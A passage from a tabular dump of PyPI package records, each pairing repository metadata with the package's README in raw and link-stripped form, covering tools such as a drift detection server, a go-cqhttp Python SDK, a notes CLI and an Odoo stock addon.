python drifting/app.py
```

## Production usage

To use Drift Detection Server in your organization,
build and deploy the Docker image, or use the pre-built version from _TODO_.

### Docker on a custom server

To deploy the on cloud instance using docker, you can easily pull the image
and run it:

```python
TODO
```

### Kubernetes and Helm

For more demanding use-cases, it's facilitated to deploy Drift Detection Server
on kubernetes. DDS is packaged with bitnami. You can include the chart by

```python
TODO
```

## Real-world scenarios

Even though Drift Detection Server makes the task incredibly easy,
it still follows the MLOps culture, assuring reproducibility,
observability and scalability postulates are fulfilled.

Please read the [Docs](https://sign-ai.github.io/drifting/)
to learn about real-world usage.


",sign-ai/drifting
ocrd-network,https://github.com/OCR-D/core,7,85,85,"# ocrd_network

> OCR-D framework - web API

See also: https://github.com/OCR-D/core
","# ocrd_network

> OCR-D framework - web API

See also: https://github.com/OCR-D/core
",ocr-d/core
nakuru-project-idk,https://github.com/idoknow/nakuru-project-idk,4,1771,1698,"<div align=""center"">
  <img width=""256"" src=""./logo.png"" alt=""logo"">

# Nakuru Project
一款为 [go-cqhttp](https://github.com/Mrs4s/go-cqhttp) 的正向 WebSocket 设计的 Python SDK，支持纯 CQ 码与消息链的转换处理

在 [kuriyama](https://github.com/Lxns-Network/mirai-python-sdk) 的基础上改动

项目名来源于藍月なくる，图标由[せら](https://www.pixiv.net/users/577968)绘制
</div>

## 食用方法
使用 `pip install git+https://github.com/Lxns-Network/nakuru-project.git` 安装。

需要将 go-cqhttp 的正向 WebSocket 与 HTTP 配置项开启。

## 示例
没有文档，源码就是文档。

```python
from nakuru import (
    CQHTTP,
    GroupMessage,
    Notify,
    GroupMessageRecall,
    FriendRequest
)
from nakuru.entities.components import Plain, Image

app = CQHTTP(
    host=""127.0.0.1"",
    port=6700,
    http_port=5700,
    token=""TOKEN"" # 可选，如果配置了 Access-Token
)

@app.receiver(""GroupMessage"")
async def _(app: CQHTTP, source: GroupMessage):
    # 通过纯 CQ 码处理
    if source.raw_message == ""戳我"":
        await app.sendGroupMessage(source.group_id, f""[CQ:poke,qq={source.user_id}]"")
    # 通过消息链处理
    chain = source.message
    if isinstance(chain[0], Plain):
        if chain[0].text == ""看"":
            await app.sendGroupMessage(source.group_id, [
                Plain(text=""给你看""),
                Image.fromFileSystem(""D:/好康的.jpg"")
            ])

@app.receiver(""GroupMessageRecall"")
async def _(app: CQHTTP, source: GroupMessageRecall):
    await app.sendGroupMessage(source.group_id, ""你撤回了一条消息"")

@app.receiver(""Notify"")
async def _(app: CQHTTP, source: Notify):
    if source.sub_type == ""poke"" and source.target_id == 114514:
        await app.sendGroupMessage(source.group_id, ""不许戳我"")

@app.receiver(""FriendRequest"")
async def _(app: CQHTTP, source: FriendRequest):
    await app.setFriendRequest(source.flag, True)

app.run()
```

## 贡献
欢迎 PR 代码或提交 Issue，项目现在还存在着许多问题。
","


# Nakuru Project
一款为 [go-cqhttp](https://github.com/Mrs4s/go-cqhttp) 的正向 WebSocket 设计的 Python SDK，支持纯 CQ 码与消息链的转换处理

在 [kuriyama](https://github.com/Lxns-Network/mirai-python-sdk) 的基础上改动

项目名来源于藍月なくる，图标由[せら](https://www.pixiv.net/users/577968)绘制


## 食用方法
使用 `pip install git+https://github.com/Lxns-Network/nakuru-project.git` 安装。

需要将 go-cqhttp 的正向 WebSocket 与 HTTP 配置项开启。

## 示例
没有文档，源码就是文档。

```python
from nakuru import (
    CQHTTP,
    GroupMessage,
    Notify,
    GroupMessageRecall,
    FriendRequest
)
from nakuru.entities.components import Plain, Image

app = CQHTTP(
    host=""127.0.0.1"",
    port=6700,
    http_port=5700,
    token=""TOKEN"" # 可选，如果配置了 Access-Token
)

@app.receiver(""GroupMessage"")
async def _(app: CQHTTP, source: GroupMessage):
    # 通过纯 CQ 码处理
    if source.raw_message == ""戳我"":
        await app.sendGroupMessage(source.group_id, f""[CQ:poke,qq={source.user_id}]"")
    # 通过消息链处理
    chain = source.message
    if isinstance(chain[0], Plain):
        if chain[0].text == ""看"":
            await app.sendGroupMessage(source.group_id, [
                Plain(text=""给你看""),
                Image.fromFileSystem(""D:/好康的.jpg"")
            ])

@app.receiver(""GroupMessageRecall"")
async def _(app: CQHTTP, source: GroupMessageRecall):
    await app.sendGroupMessage(source.group_id, ""你撤回了一条消息"")

@app.receiver(""Notify"")
async def _(app: CQHTTP, source: Notify):
    if source.sub_type == ""poke"" and source.target_id == 114514:
        await app.sendGroupMessage(source.group_id, ""不许戳我"")

@app.receiver(""FriendRequest"")
async def _(app: CQHTTP, source: FriendRequest):
    await app.setFriendRequest(source.flag, True)

app.run()
```

## 贡献
欢迎 PR 代码或提交 Issue，项目现在还存在着许多问题。
",idoknow/nakuru-project-idk
rmrkl,https://github.com/whitead/robust-mrkl,1,420,420,"# robust-mrkl

A [langchain](https://github.com/hwchase17/langchain) agent that retries and utilizes a system prompt

## Install

```sh
pip install rmrkl
```

## Usage

```py
from rmrkl import ChatZeroShotAgent, RetryAgentExecutor

tools = ...
llm = ..

agent = RetryAgentExecutor.from_agent_and_tools(
    tools=tools,
    agent=ChatZeroShotAgent.from_llm_and_tools(llm, tools),
    verbose=True,
)
agent.run(...)

```
","# robust-mrkl

A [langchain](https://github.com/hwchase17/langchain) agent that retries and utilizes a system prompt

## Install

```sh
pip install rmrkl
```

## Usage

```py
from rmrkl import ChatZeroShotAgent, RetryAgentExecutor

tools = ...
llm = ..

agent = RetryAgentExecutor.from_agent_and_tools(
    tools=tools,
    agent=ChatZeroShotAgent.from_llm_and_tools(llm, tools),
    verbose=True,
)
agent.run(...)

```
",whitead/robust-mrkl
code-genie,https://github.com/thismlguy/code-genie,21,1549,1549,"# code-genie
This library is your copilot for jupyter notebooks

Latest version: 0.2.0

## Documentation

- [Starter Notebook](https://code-genie.readthedocs.io/en/main/notebooks/Starter.html)
- [All Examples](https://code-genie.readthedocs.io/en/main/examples.html)
- [API Documentation](https://code-genie.readthedocs.io/en/main/api.html)

## Installation

```bash
pip install code-genie
```

## Access Token
You need your unique access token to use this library. You can get your access token
by signing up here [here](https://dodie819.preview.softr.app/?t=1682342288534)

## Usage

### Setting environment variables
On the top of your notebook, set an environment variable called `CODE_GENIE_TOKEN` as your access token. This can
be done in a couple of ways:

#### Using env magic
```
%env CODE_GENIE_TOKEN=xxxkeyxxx
```

#### Using dotenv
You can use the [python-dotenv](https://github.com/theskumar/python-dotenv) package.
```
from dotenv import load_dotenv
load_dotenv(""path-to-.env-file"")
```

#### Pandas data processing

Following is an example to get the number of missing values in each column of a dataframe.

```python
from code_genie import PandasGenie
genie = PandasGenie(instructions=[
    ""create a new dataframe which contains the number of missing values in each column"",
    ""add a column to this dataframe representing the percentage of total points which are missing"",
    ""sort dataframe in descending order of number of missing items"",
    ""filter out columns which have no missing values""
    ])
df_missing = genie(df)
```
","# code-genie
This library is your copilot for jupyter notebooks

Latest version: 0.2.0

## Documentation

- [Starter Notebook](https://code-genie.readthedocs.io/en/main/notebooks/Starter.html)
- [All Examples](https://code-genie.readthedocs.io/en/main/examples.html)
- [API Documentation](https://code-genie.readthedocs.io/en/main/api.html)

## Installation

```bash
pip install code-genie
```

## Access Token
You need your unique access token to use this library. You can get your access token
by signing up here [here](https://dodie819.preview.softr.app/?t=1682342288534)

## Usage

### Setting environment variables
On the top of your notebook, set an environment variable called `CODE_GENIE_TOKEN` as your access token. This can
be done in a couple of ways:

#### Using env magic
```
%env CODE_GENIE_TOKEN=xxxkeyxxx
```

#### Using dotenv
You can use the [python-dotenv](https://github.com/theskumar/python-dotenv) package.
```
from dotenv import load_dotenv
load_dotenv(""path-to-.env-file"")
```

#### Pandas data processing

Following is an example to get the number of missing values in each column of a dataframe.

```python
from code_genie import PandasGenie
genie = PandasGenie(instructions=[
    ""create a new dataframe which contains the number of missing values in each column"",
    ""add a column to this dataframe representing the percentage of total points which are missing"",
    ""sort dataframe in descending order of number of missing items"",
    ""filter out columns which have no missing values""
    ])
df_missing = genie(df)
```
",thismlguy/code-genie
autora-theorist-darts,https://github.com/AutoResearch/autora-theorist-darts,7,2201,2201,"# AutoRA DARTS Theorist

`autora-theorist-darts` is a Python module for fitting data using differentiable architecture 
search, built on AutoRA.

Website: [https://autoresearch.github.io/autora/](https://autoresearch.github.io/autora/)

## User Guide

You will need:

- `python` 3.8 or greater: [https://www.python.org/downloads/](https://www.python.org/downloads/)
- `graphviz` (optional, required for computation graph visualizations): 
  [https://graphviz.org/download/](https://graphviz.org/download/)

Install DARTS as part of the `autora` package:

```shell
pip install -U ""autora[theorist-darts]""
```

> It is recommended to use a `python` environment manager like `virtualenv`.

Check your installation by running:
```shell
python -c ""from autora.theorist.darts import DARTSRegressor; DARTSRegressor()""
```

## Developer Guide

### Get started

Clone the repository (e.g. using [GitHub desktop](https://desktop.github.com), 
or the [`gh` command line tool](https://cli.github.com)) 
and install it in ""editable"" mode in an isolated `python` environment, (e.g. 
with 
[virtualenv](https://virtualenv.pypa.io/en/latest/installation.html)) as follows:

In the repository root, create a new virtual environment:
```shell
virtualenv venv
```

Activate it:
```shell
source venv/bin/activate
```

Use `pip install` to install the current project (`"".""`) in editable mode (`-e`) with dev-dependencies (`[dev]`):
```shell
pip install -e "".[dev]""
```

Run the test cases:
```shell
pytest tests/ --doctest-modules src/
```

Activate the pre-commit hooks:
```shell
pre-commit install
```

### Add new dependencies 

In pyproject.toml add the new dependencies under `dependencies`

Install the added dependencies
```shell
pip install -e "".[dev]""
```

### Publish the package

Update the metadata under `project` in the pyproject.toml file to include name, description, author-name, author-email and version

- Follow the guide here: [https://packaging.python.org/en/latest/tutorials/packaging-projects/](https://packaging.python.org/en/latest/tutorials/packaging-projects/)

Build the package using:
```shell
python -m build
```

Publish the package to PyPI using `twine`:
```shell
twine upload dist/*
```
","# AutoRA DARTS Theorist

`autora-theorist-darts` is a Python module for fitting data using differentiable architecture 
search, built on AutoRA.

Website: [https://autoresearch.github.io/autora/](https://autoresearch.github.io/autora/)

## User Guide

You will need:

- `python` 3.8 or greater: [https://www.python.org/downloads/](https://www.python.org/downloads/)
- `graphviz` (optional, required for computation graph visualizations): 
  [https://graphviz.org/download/](https://graphviz.org/download/)

Install DARTS as part of the `autora` package:

```shell
pip install -U ""autora[theorist-darts]""
```

> It is recommended to use a `python` environment manager like `virtualenv`.

Check your installation by running:
```shell
python -c ""from autora.theorist.darts import DARTSRegressor; DARTSRegressor()""
```

## Developer Guide

### Get started

Clone the repository (e.g. using [GitHub desktop](https://desktop.github.com), 
or the [`gh` command line tool](https://cli.github.com)) 
and install it in ""editable"" mode in an isolated `python` environment, (e.g. 
with 
[virtualenv](https://virtualenv.pypa.io/en/latest/installation.html)) as follows:

In the repository root, create a new virtual environment:
```shell
virtualenv venv
```

Activate it:
```shell
source venv/bin/activate
```

Use `pip install` to install the current project (`"".""`) in editable mode (`-e`) with dev-dependencies (`[dev]`):
```shell
pip install -e "".[dev]""
```

Run the test cases:
```shell
pytest tests/ --doctest-modules src/
```

Activate the pre-commit hooks:
```shell
pre-commit install
```

### Add new dependencies 

In pyproject.toml add the new dependencies under `dependencies`

Install the added dependencies
```shell
pip install -e "".[dev]""
```

### Publish the package

Update the metadata under `project` in the pyproject.toml file to include name, description, author-name, author-email and version

- Follow the guide here: [https://packaging.python.org/en/latest/tutorials/packaging-projects/](https://packaging.python.org/en/latest/tutorials/packaging-projects/)

Build the package using:
```shell
python -m build
```

Publish the package to PyPI using `twine`:
```shell
twine upload dist/*
```
",autoresearch/autora-theorist-darts
client-gpt,https://github.com/littleknitsstory/client-gpt,1,0,0,,,littleknitsstory/client-gpt
brainsurf,https://github.com/preethihiremath/brainsurf,0,0,0,,,preethihiremath/brainsurf
colinote,https://github.com/tiakas/colinote,3,2108,2108,"# Colinote

Colinote is a command-line tool for managing notes.

## Installation

You can install Colinote using pip:

```
pip install colinote
```


## Usage

To use Colinote, simply run the colinote command followed by the action you want to perform and any relevant options.

## Actions
*add:* Add a new note to a context.

*edit:* Edit an existing note.

*delete:* Delete an existing note.

*show*: List all notes or all notes for a specific id,context or date.

*Options*
- *-c, --context:* The context for the note.
- *-t, --text:* The text of the note.
- *-d, --date:* The date of the note (in the format ""YYYY-MM-DD"").
- *-i, --id:* The ID of the note.

### Examples

*Add a note in default context (todo)*
```
colinote add ""I did something amazing""
```

*Add a note in context ""standup""*
```
colinote add ""I did something amazing"" -c ""standup""
```

*Edit a note with id 1 and change the text*
```
colinote edit 1 -t ""I did something even more amazing""
```

*Edit a note with id 1 and change the context*
```
colinote edit 1 -c ""standup""
```

*Delete note with id 1*
```
colinote delete 1
```

*List all notes*
```
colinote show
```

*List all notes for a specific context*
```
colinote show -c ""work""
```

*List all notes for a specific date*
```
colinote show -d ""2023-01-01""
```

*Show a specific note*
```
colinote show -i 1
```

## Contributing
Contributions are always welcome! Here are some ways to contribute:

- Fork the repository and make changes on your local branch.
- Create a pull request with your changes.
- Work on open issues.

## Development

To develop Colinote, first clone the repository:
```
git clone https://github.com/tiakas/colinote.git`
cd colinote
```
Then, install the development dependencies:

```
pip install -r requirements.txt
```

To run the tests, use:
```
pytest
```

To build the package, use:
```
python setup.py sdist bdist_wheel
```

This will create a dist directory containing the source distribution (*.tar.gz) and wheel distribution (*.whl) of the package.

## License

This project is licensed under the MIT License - see the LICENSE file for details.
","# Colinote

Colinote is a command-line tool for managing notes.

## Installation

You can install Colinote using pip:

```
pip install colinote
```


## Usage

To use Colinote, simply run the colinote command followed by the action you want to perform and any relevant options.

## Actions
*add:* Add a new note to a context.

*edit:* Edit an existing note.

*delete:* Delete an existing note.

*show*: List all notes or all notes for a specific id,context or date.

*Options*
- *-c, --context:* The context for the note.
- *-t, --text:* The text of the note.
- *-d, --date:* The date of the note (in the format ""YYYY-MM-DD"").
- *-i, --id:* The ID of the note.

### Examples

*Add a note in default context (todo)*
```
colinote add ""I did something amazing""
```

*Add a note in context ""standup""*
```
colinote add ""I did something amazing"" -c ""standup""
```

*Edit a note with id 1 and change the text*
```
colinote edit 1 -t ""I did something even more amazing""
```

*Edit a note with id 1 and change the context*
```
colinote edit 1 -c ""standup""
```

*Delete note with id 1*
```
colinote delete 1
```

*List all notes*
```
colinote show
```

*List all notes for a specific context*
```
colinote show -c ""work""
```

*List all notes for a specific date*
```
colinote show -d ""2023-01-01""
```

*Show a specific note*
```
colinote show -i 1
```

## Contributing
Contributions are always welcome! Here are some ways to contribute:

- Fork the repository and make changes on your local branch.
- Create a pull request with your changes.
- Work on open issues.

## Development

To develop Colinote, first clone the repository:
```
git clone https://github.com/tiakas/colinote.git`
cd colinote
```
Then, install the development dependencies:

```
pip install -r requirements.txt
```

To run the tests, use:
```
pytest
```

To build the package, use:
```
python setup.py sdist bdist_wheel
```

This will create a dist directory containing the source distribution (*.tar.gz) and wheel distribution (*.whl) of the package.

## License

This project is licensed under the MIT License - see the LICENSE file for details.
",tiakas/colinote
knowledge-base-search,https://github.com/cabeywic/knowledge-base-search,9,3102,3074,"# Knowledge Base Search

This project provides an efficient and scalable solution to search and query a large knowledge base of documents. It allows users to search for information easily by leveraging advanced NLP techniques like BERT embeddings.

## Features

- Organized code structure following SOLID principles
- BERT search for semantic similarity between queries and documents
- Preprocessing using SpaCy for efficient text processing
- Caching system to store preprocessed data and search algorithm instances for faster subsequent searches
- Logging to track search-related information and potential issues

## Methodology

The Knowledge Base Search tool employs a two-step process to find relevant documents and generate human-readable answers:

1. **Semantic Search**: The tool preprocesses and indexes the input documents using advanced NLP techniques like BERT/MiniLM embeddings or a custom search implementation. These embeddings capture the semantic meaning of the text, allowing the search algorithm to find documents that are not just textually similar, but also semantically related to the input query. This approach ensures a more accurate and context-aware selection of relevant documents.

2. **Answer Generation**: After retrieving the most relevant documents, the tool integrates with OpenAI's Chat GPT API to generate human-readable answers based on the provided context. By only sending the relevant context, we can reduce the cost and improve the performance of the API calls, while ensuring that the generated answers are accurate and contextually appropriate.

This methodology is designed to be easily extensible and customizable, allowing users to implement their own search algorithms or NLP models to tailor the solution to their specific use case.


## Installation

To set up the project, follow these steps:

1. Clone the repository:

```sh
git clone https://github.com/your_username/knowledge_base_search.git
```

2. Change the directory:
```sh
cd knowledge_base_search
```

3. Create a virtual environment:
- For Windows:
```sh
python -m venv venv
```
- For Linux/Mac:
```sh
python3 -m venv venv
```

4. Activate the virtual environment:
- For Windows:
```sh
venv\Scripts\activate
```
- For Linux/Mac:
```sh
source venv/bin/activate
```

5. Install the required packages:
```sh
pip install -r requirements.txt
```

6. Create a `.env` file in the root of your project and add the openai_api_key variable. Replace `<your_api_key>` with your actual API key:

```sh
openai_api_key=<your_api_key>
```

## Usage

1. Add your documents in JSON format to the `data/raw_data/documents.json` file.

2. Update the `main.py` file with your query and other necessary modifications.

3. Run the `main.py` script:

```sh
python main.py
```

This will load the documents, preprocess them, and index them using the specified search algorithm (e.g., BERT). Then, it will search for relevant documents based on your query and return the top matching results.

## Contributing

Contributions are welcome! Please feel free to open issues or submit pull requests to improve the project.

","# Knowledge Base Search

This project provides an efficient and scalable solution to search and query a large knowledge base of documents. It allows users to search for information easily by leveraging advanced NLP techniques like BERT embeddings.

## Features

- Organized code structure following SOLID principles
- BERT search for semantic similarity between queries and documents
- Preprocessing using SpaCy for efficient text processing
- Caching system to store preprocessed data and search algorithm instances for faster subsequent searches
- Logging to track search-related information and potential issues

## Methodology

The Knowledge Base Search tool employs a two-step process to find relevant documents and generate human-readable answers:

1. **Semantic Search**: The tool preprocesses and indexes the input documents using advanced NLP techniques like BERT/MiniLM embeddings or a custom search implementation. These embeddings capture the semantic meaning of the text, allowing the search algorithm to find documents that are not just textually similar, but also semantically related to the input query. This approach ensures a more accurate and context-aware selection of relevant documents.

2. **Answer Generation**: After retrieving the most relevant documents, the tool integrates with OpenAI's Chat GPT API to generate human-readable answers based on the provided context. By only sending the relevant context, we can reduce the cost and improve the performance of the API calls, while ensuring that the generated answers are accurate and contextually appropriate.

This methodology is designed to be easily extensible and customizable, allowing users to implement their own search algorithms or NLP models to tailor the solution to their specific use case.


## Installation

To set up the project, follow these steps:

1. Clone the repository:

```sh
git clone https://github.com/your_username/knowledge_base_search.git
```

2. Change the directory:
```sh
cd knowledge_base_search
```

3. Create a virtual environment:
- For Windows:
```sh
python -m venv venv
```
- For Linux/Mac:
```sh
python3 -m venv venv
```

4. Activate the virtual environment:
- For Windows:
```sh
venv\Scripts\activate
```
- For Linux/Mac:
```sh
source venv/bin/activate
```

5. Install the required packages:
```sh
pip install -r requirements.txt
```

6. Create a `.env` file in the root of your project and add the openai_api_key variable. Replace `` with your actual API key:

```sh
openai_api_key=
```

## Usage

1. Add your documents in JSON format to the `data/raw_data/documents.json` file.

2. Update the `main.py` file with your query and other necessary modifications.

3. Run the `main.py` script:

```sh
python main.py
```

This will load the documents, preprocess them, and index them using the specified search algorithm (e.g., BERT). Then, it will search for relevant documents based on your query and return the top matching results.

## Contributing

Contributions are welcome! Please feel free to open issues or submit pull requests to improve the project.

",cabeywic/knowledge-base-search
odoo14-addon-stock-location-orderpoint-source-relocate,https://github.com/OCA/stock-logistics-warehouse,3,3531,3013,"=========================================
stock_location_orderpoint_source_relocate
=========================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Alpha-red.png
    :target: https://odoo-community.org/page/development-status
    :alt: Alpha
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--warehouse-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-warehouse/tree/14.0/stock_location_orderpoint_source_relocate
    :alt: OCA/stock-logistics-warehouse
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-warehouse-14-0/stock-logistics-warehouse-14-0-stock_location_orderpoint_source_relocate
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/153/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

Run an auto location orderpoint replenishment also after a move gets relocated by Stock Move Source Relocate

.. IMPORTANT::
   This is an alpha version, the data model and design can change at any time without warning.
   Only for development or testing purpose, do not use in production.
   `More details on development status <https://odoo-community.org/page/development-status>`_

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/stock-logistics-warehouse/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/stock-logistics-warehouse/issues/new?body=module:%20stock_location_orderpoint_source_relocate%0Aversion:%2014.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* MT Software

Contributors
~~~~~~~~~~~~

* Michael Tietz (MT Software) <mtietz@mt-software.de>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-mt-software-de| image:: https://github.com/mt-software-de.png?size=40px
    :target: https://github.com/mt-software-de
    :alt: mt-software-de

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-mt-software-de| 

This module is part of the `OCA/stock-logistics-warehouse <https://github.com/OCA/stock-logistics-warehouse/tree/14.0/stock_location_orderpoint_source_relocate>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","=========================================
stock_location_orderpoint_source_relocate
=========================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Alpha-red.png
    :target: https://odoo-community.org/page/development-status
    :alt: Alpha
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--warehouse-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-warehouse/tree/14.0/stock_location_orderpoint_source_relocate
    :alt: OCA/stock-logistics-warehouse
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-warehouse-14-0/stock-logistics-warehouse-14-0-stock_location_orderpoint_source_relocate
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/153/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

Run an auto location orderpoint replenishment also after a move gets relocated by Stock Move Source Relocate

.. IMPORTANT::
   This is an alpha version, the data model and design can change at any time without warning.
   Only for development or testing purpose, do not use in production.
   `More details on development status `_

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* MT Software

Contributors
~~~~~~~~~~~~

* Michael Tietz (MT Software) 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-mt-software-de| image:: https://github.com/mt-software-de.png?size=40px
    :target: https://github.com/mt-software-de
    :alt: mt-software-de

Current `maintainer `__:

|maintainer-mt-software-de| 

This module is part of the `OCA/stock-logistics-warehouse `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/stock-logistics-warehouse
cake-utils-pkg-poorva278,https://github.com/pypa/sampleproject,0,0,0,,,pypa/sampleproject
vidimera,https://github.com/DevL/vidimera,0,2038,2038,"# Vidimera

![PyPI](https://img.shields.io/pypi/v/vidimera)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/vidimera)
![PyPI - Status](https://img.shields.io/pypi/status/vidimera)
![PyPI - License](https://img.shields.io/pypi/l/vidimera)
[![Python package](https://github.com/DevL/vidimera/actions/workflows/python-package.yml/badge.svg)](https://github.com/DevL/vidimera/actions/workflows/python-package.yml)

_Python signature and behaviour checker inspired by Elixir._

In Swedish, _vidimera_ means _to attest_ or _to certify_. It is commonly used to attest that a copy of a document is accurate compared to the original.

## Installation

Install the package `vidimera` version `0.2+` from PyPI.
The recommended `requirements.txt` line is `vidimera~=0.2`.

## Current Functionality

### `assert_implements(object, expected)`
- Raises an `AssertionError` listing missing callables and their signatures if there are any. Based on `behaviour.implements`.

### `Behaviour(object)`
- Creates a new `Behaviour` instance.
- If `object` already is an instance of `Behaviour`, it is returned unchanged.

### `behaviour.implemented_by(other)`
- Verifies that `other` at least has the same public and dunderscore callables with the same signatures as the `behaviour`.
- Creats a `Behaviour` from `other` before making the comparison.

### `behaviour.implements(other)`
- Verifies that the `behaviour` at least has the same public and dunderscore callables with the same signatures as `other`.
- Creats a `Behaviour` from `other` before making the comparison.

### `behaviour.signatures(scope=Behaviour.PUBLIC_AND_SPECIAL)`
- Returns a `set` of tuples that represent the name and the callable selected based on the `scope`.
- Possible scopes include `PUBLIC`, `PRIVATE`, `SPECIAL`, and `PUBLIC_AND_SPECIAL`.

### `MissingBehaviour(delta)`
- An internal representation of missing behaviour. Created from a set of names and signatures. If the set is empty, this object will be truthy. If the set is non-empty, this object is falsy.
","# Vidimera

![PyPI](https://img.shields.io/pypi/v/vidimera)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/vidimera)
![PyPI - Status](https://img.shields.io/pypi/status/vidimera)
![PyPI - License](https://img.shields.io/pypi/l/vidimera)
[![Python package](https://github.com/DevL/vidimera/actions/workflows/python-package.yml/badge.svg)](https://github.com/DevL/vidimera/actions/workflows/python-package.yml)

_Python signature and behaviour checker inspired by Elixir._

In Swedish, _vidimera_ means _to attest_ or _to certify_. It is commonly used to attest that a copy of a document is accurate compared to the original.

## Installation

Install the package `vidimera` version `0.2+` from PyPI.
The recommended `requirements.txt` line is `vidimera~=0.2`.

## Current Functionality

### `assert_implements(object, expected)`
- Raises an `AssertionError` listing missing callables and their signatures if there are any. Based on `behaviour.implements`.

### `Behaviour(object)`
- Creates a new `Behaviour` instance.
- If `object` already is an instance of `Behaviour`, it is returned unchanged.

### `behaviour.implemented_by(other)`
- Verifies that `other` at least has the same public and dunderscore callables with the same signatures as the `behaviour`.
- Creats a `Behaviour` from `other` before making the comparison.

### `behaviour.implements(other)`
- Verifies that the `behaviour` at least has the same public and dunderscore callables with the same signatures as `other`.
- Creats a `Behaviour` from `other` before making the comparison.

### `behaviour.signatures(scope=Behaviour.PUBLIC_AND_SPECIAL)`
- Returns a `set` of tuples that represent the name and the callable selected based on the `scope`.
- Possible scopes include `PUBLIC`, `PRIVATE`, `SPECIAL`, and `PUBLIC_AND_SPECIAL`.

### `MissingBehaviour(delta)`
- An internal representation of missing behaviour. Created from a set of names and signatures. If the set is empty, this object will be truthy. If the set is non-empty, this object is falsy.
",devl/vidimera
antchain-ak-ee637c8293f64104af9686dc12e0cd18,https://github.com/alipay/antchain-openapi-prod-sdk,3,1080,1080,"English | [简体中文](README-CN.md)

## Ant Chain ak_ee637c8293f64104af9686dc12e0cd18 SDK for Python

## Requirements

- Python >= 3.6

## Installation

- **Install with pip**

Python SDK uses a common package management tool named `pip`. If pip is not installed, see the [pip user guide](https://pip.pypa.io/en/stable/installing/ ""pip User Guide"") to install pip.

```bash
# Install the antchain-ak_ee637c8293f64104af9686dc12e0cd18
pip install antchain-ak_ee637c8293f64104af9686dc12e0cd18
```

## Issues

[Opening an Issue](https://github.com/alipay/antchain-openapi-prod-sdk/issues/new), Issues not conforming to the guidelines may be closed immediately.

## Usage

[Quick Examples](https://github.com/alipay/antchain-openapi-prod-sdk)

## Changelog

Detailed changes for each release are documented in the [release notes](./ChangeLog.md).

## References

- [Latest Release](https://github.com/alipay/antchain-openapi-prod-sdk/tree/master/python)

## License

[Apache-2.0](http://www.apache.org/licenses/LICENSE-2.0)

Copyright (c) 2009-present, Alibaba Cloud All rights reserved.


","English | [简体中文](README-CN.md)

## Ant Chain ak_ee637c8293f64104af9686dc12e0cd18 SDK for Python

## Requirements

- Python >= 3.6

## Installation

- **Install with pip**

Python SDK uses a common package management tool named `pip`. If pip is not installed, see the [pip user guide](https://pip.pypa.io/en/stable/installing/ ""pip User Guide"") to install pip.

```bash
# Install the antchain-ak_ee637c8293f64104af9686dc12e0cd18
pip install antchain-ak_ee637c8293f64104af9686dc12e0cd18
```

## Issues

[Opening an Issue](https://github.com/alipay/antchain-openapi-prod-sdk/issues/new), Issues not conforming to the guidelines may be closed immediately.

## Usage

[Quick Examples](https://github.com/alipay/antchain-openapi-prod-sdk)

## Changelog

Detailed changes for each release are documented in the [release notes](./ChangeLog.md).

